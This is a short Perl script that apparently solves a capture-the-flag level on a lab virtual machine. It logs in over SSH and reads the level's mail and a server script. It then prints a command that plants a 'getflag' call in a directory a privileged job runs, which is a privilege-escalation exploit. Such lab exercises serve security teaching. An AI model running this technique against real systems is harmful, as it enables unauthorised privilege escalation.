#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level05";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$inject = "ssh -qp 4242 $user\@$ip 'cat /var/mail/level05 && cat /usr/sbin/openarenaserver'";
$exploit = "echo 'getflag | write level05' > /opt/openarenaserver/flag";
print $red, $inject, $reset, "\n";
system($inject);
print $green, $exploit, $reset, "\n";
